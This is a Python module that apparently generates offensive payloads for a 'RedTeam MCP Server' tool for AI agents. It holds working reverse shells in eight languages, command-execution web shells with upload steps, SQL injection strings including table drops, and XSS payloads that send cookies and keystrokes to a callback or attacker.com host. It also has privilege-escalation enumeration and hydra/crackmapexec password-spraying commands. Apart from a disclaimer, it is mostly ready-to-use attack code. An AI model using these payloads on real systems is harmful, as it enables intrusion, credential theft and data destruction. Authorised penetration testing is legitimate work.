"""
Payload generation module for RedTeam MCP Server.

This module provides payload generation capabilities for authorized security testing.
All generated payloads should only be used with explicit written permission.
"""

import base64
from typing import List, Optional

from .utils import LEGAL_WARNING


class PayloadGenerator:
    """Generator for various security testing payloads."""

    def __init__(self):
        """Initialize the payload generator."""
        pass

    def generate_reverse_shell(
        self,
        shell_type: str,
        lhost: str,
        lport: int,
        encode: bool = False
    ) -> str:
        """
        Generate reverse shell payloads.

        Args:
            shell_type: Type of shell (bash, python, php, etc.)
            lhost: Listener host IP
            lport: Listener port
            encode: Whether to base64 encode the payload

        Returns:
            Formatted markdown with reverse shell payload
        """
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "netcat": f"nc -e /bin/sh {lhost} {lport}",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh"
        }

        payload = payloads.get(shell_type, payloads["bash"])

        if encode:
            encoded = base64.b64encode(payload.encode()).decode()
            payload = f"echo {encoded} | base64 -d | bash"

        output = f"""# Reverse Shell Payload
**Type:** {shell_type}
**LHOST:** {lhost}
**LPORT:** {lport}
**Encoded:** {encode}

## Payload
```{shell_type}
{payload}
```

## Setup Instructions
1. Start listener: `nc -lvnp {lport}`
2. Execute payload on target system
3. Wait for connection

{LEGAL_WARNING}
"""
        return output

    def generate_web_shell(
        self,
        shell_type: str,
        password: Optional[str] = None,
        obfuscate: bool = False
    ) -> str:
        """
        Generate web shell payloads.

        Args:
            shell_type: Type of web shell (php_simple, php_advanced, jsp, aspx)
            password: Optional password protection
            obfuscate: Whether to obfuscate the shell

        Returns:
            Formatted markdown with web shell code
        """
        shells = {
            "php_simple": "<?php system($_GET['cmd']); ?>",
            "php_advanced": """<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
<form method="POST">
    <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>""",
            "jsp": """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        int c;
        while((c = in.read()) != -1) {
            out.print((char)c);
        }
    }
%>""",
            "aspx": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if(Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>""",
            "perl_cgi": """#!/usr/bin/perl
use CGI;
$q = new CGI;
print $q->header;
$cmd = $q->param('cmd');
print `$cmd` if $cmd;
"""
        }

        shell_code = shells.get(shell_type, shells["php_simple"])

        if password and shell_type.startswith("php"):
            shell_code = f"""<?php
$password = "{password}";
if(isset($_POST['pass']) && $_POST['pass'] == $password) {{
    {shell_code}
}} else {{
    echo "<form method='POST'><input type='password' name='pass'><input type='submit'></form>";
}}
?>"""

        output = f"""# Web Shell
**Type:** {shell_type}
**Password Protected:** {password is not None}
**Obfuscated:** {obfuscate}

## Code
```{'php' if shell_type.startswith('php') else shell_type.split('_')[0]}
{shell_code}
```

## Usage
1. Upload to target web server
2. Access via browser: `http://target/shell.{shell_type.split('_')[0]}?cmd=whoami`
3. Execute commands via cmd parameter

{LEGAL_WARNING}
"""
        return output

    def generate_sqli_payloads(
        self,
        injection_type: str,
        columns: Optional[int] = None,
        database: str = "mysql"
    ) -> str:
        """
        Generate SQL injection payloads.

        Args:
            injection_type: Type of SQLi (auth_bypass, union_based, etc.)
            columns: Number of columns for UNION attacks
            database: Target database type

        Returns:
            Formatted markdown with SQLi payloads
        """
        payloads = []

        if injection_type == "auth_bypass":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' OR 1=1--",
                "') OR ('1'='1",
            ]
        elif injection_type == "union_based":
            cols = columns or 3
            payloads = [
                f"' UNION SELECT {','.join(['NULL']*cols)}--",
                f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--",
                f"' UNION SELECT {','.join(['NULL']*(cols-1))},@@version--",
            ]
        elif injection_type == "error_based":
            payloads = [
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=1/0--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
            ]
        elif injection_type == "blind_boolean":
            payloads = [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
            ]
        elif injection_type == "blind_time":
            payloads = [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--",
            ]
        elif injection_type == "stacked_queries":
            payloads = [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('admin','pass')--",
            ]

        output = f"""# SQL Injection Payloads
**Type:** {injection_type}
**Database:** {database}
**Columns:** {columns or 'N/A'}

## Payloads
"""
        for i, payload in enumerate(payloads, 1):
            output += f"{i}. `{payload}`\n"

        output += """
## Testing Steps
1. Identify injection point
2. Test with single quote to trigger error
3. Use UNION to enumerate columns
4. Extract sensitive data
5. Document findings

{LEGAL_WARNING}
"""
        return output

    def generate_xss_payloads(
        self,
        xss_type: str,
        callback_url: Optional[str] = None,
        bypass_filters: bool = False
    ) -> str:
        """
        Generate XSS payloads.

        Args:
            xss_type: Type of XSS (reflected, stored, dom_based, etc.)
            callback_url: URL for exfiltration
            bypass_filters: Include filter bypass techniques

        Returns:
            Formatted markdown with XSS payloads
        """
        payloads = []

        if xss_type == "reflected" or xss_type == "stored":
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
            ]
        elif xss_type == "dom_based":
            payloads = [
                "javascript:alert('XSS')",
                "#<img src=x onerror=alert('XSS')>",
            ]
        elif xss_type == "cookie_stealer" and callback_url:
            payloads = [
                f"<script>fetch('{callback_url}?c='+document.cookie)</script>",
                f"<img src=x onerror=this.src='{callback_url}?c='+document.cookie>",
            ]
        elif xss_type == "keylogger" and callback_url:
            payloads = [
                f"<script>document.onkeypress=function(e){{fetch('{callback_url}?k='+e.key)}}</script>",
            ]
        elif xss_type == "phishing":
            payloads = [
                "<script>document.body.innerHTML='<form action=\"http://attacker.com\"><input name=\"user\"><input type=\"password\" name=\"pass\"><input type=\"submit\"></form>'</script>",
            ]

        if bypass_filters:
            payloads.extend([
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>",
                "<svg/onload=alert&lpar;'XSS'&rpar;>",
            ])

        output = f"""# XSS Payloads
**Type:** {xss_type}
**Callback URL:** {callback_url or 'N/A'}
**Filter Bypass:** {bypass_filters}

## Payloads
"""
        for i, payload in enumerate(payloads, 1):
            output += f"{i}. `{payload}`\n"

        output += """
## Testing Steps
1. Identify injection point
2. Test basic payload
3. Analyze filters/sanitization
4. Craft bypass if needed
5. Document impact

{LEGAL_WARNING}
"""
        return output

    def generate_privesc_enum(
        self,
        target_os: str,
        check_type: str = "all"
    ) -> str:
        """
        Generate privilege escalation enumeration commands.

        Args:
            target_os: Target OS (linux, windows)
            check_type: Type of checks to run

        Returns:
            Formatted markdown with enumeration commands
        """
        commands = []

        if target_os == "linux":
            if check_type in ["all", "quick"]:
                commands.extend([
                    ("System Info", "uname -a; cat /etc/*-release"),
                    ("Current User", "id; whoami"),
                    ("Sudo Rights", "sudo -l"),
                ])
            if check_type in ["all", "suid"]:
                commands.extend([
                    ("SUID Binaries", "find / -perm -4000 -type f 2>/dev/null"),
                    ("SGID Binaries", "find / -perm -2000 -type f 2>/dev/null"),
                ])
            if check_type in ["all", "kernel"]:
                commands.append(("Kernel Version", "uname -r"))
            if check_type in ["all", "cron"]:
                commands.extend([
                    ("Cron Jobs", "cat /etc/crontab; ls -la /etc/cron*"),
                    ("User Crontab", "crontab -l"),
                ])
            if check_type in ["all", "services"]:
                commands.extend([
                    ("Running Services", "ps aux | grep root"),
                    ("Network Connections", "netstat -tulpn"),
                ])

        elif target_os == "windows":
            if check_type in ["all", "quick"]:
                commands.extend([
                    ("System Info", "systeminfo"),
                    ("Current User", "whoami /all"),
                    ("User Privileges", "whoami /priv"),
                ])
            if check_type in ["all", "services"]:
                commands.extend([
                    ("Running Services", "wmic service get name,displayname,pathname,startmode"),
                    ("Unquoted Service Paths", "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\""),
                ])
            if check_type in ["all"]:
                commands.extend([
                    ("Scheduled Tasks", "schtasks /query /fo LIST /v"),
                    ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"),
                ])

        output = f"""# Privilege Escalation Enumeration
**Target OS:** {target_os}
**Check Type:** {check_type}

## Commands
"""
        for title, cmd in commands:
            output += f"### {title}\n```bash\n{cmd}\n```\n\n"

        output += """
## Next Steps
1. Run enumeration commands
2. Analyze output for vulnerabilities
3. Research specific exploits
4. Test in controlled environment
5. Document privilege escalation path

{LEGAL_WARNING}
"""
        return output

    def generate_cred_spray(
        self,
        target_service: str,
        usernames: List[str],
        passwords: List[str],
        target: Optional[str] = None
    ) -> str:
        """
        Generate credential spray attack commands.

        Args:
            target_service: Target service (smb, ssh, rdp, etc.)
            usernames: List of usernames
            passwords: List of passwords
            target: Target IP/hostname

        Returns:
            Formatted markdown with credential spray commands
        """
        target_str = target or "TARGET_IP"

        examples = {
            "smb": f"crackmapexec smb {target_str} -u users.txt -p passwords.txt",
            "ssh": f"hydra -L users.txt -P passwords.txt ssh://{target_str}",
            "rdp": f"crowbar -b rdp -s {target_str}/32 -u users.txt -C passwords.txt",
            "http": f"hydra -L users.txt -P passwords.txt {target_str} http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"",
            "ldap": f"ldapsearch -x -h {target_str} -D \"user@domain\" -w password",
            "ftp": f"hydra -L users.txt -P passwords.txt ftp://{target_str}",
            "winrm": f"crackmapexec winrm {target_str} -u users.txt -p passwords.txt",
        }

        command = examples.get(target_service.lower(), "# No example for this service")

        output = f"""# Credential Spray Attack
**Target Service:** {target_service}
**Target:** {target_str}
**Usernames:** {len(usernames)}
**Passwords:** {len(passwords)}

## Usernames
"""
        for user in usernames[:10]:  # Limit display
            output += f"- {user}\n"
        if len(usernames) > 10:
            output += f"... and {len(usernames) - 10} more\n"

        output += "\n## Passwords\n"
        for pwd in passwords[:5]:  # Limit display
            output += f"- {pwd}\n"
        if len(passwords) > 5:
            output += f"... and {len(passwords) - 5} more\n"

        output += f"""
## Example Command
```bash
{command}
```

## Best Practices
1. Use delays to avoid account lockouts
2. Test with small subset first
3. Monitor for detection
4. Document successful credentials
5. Follow engagement rules of engagement

{LEGAL_WARNING}
"""
        return output
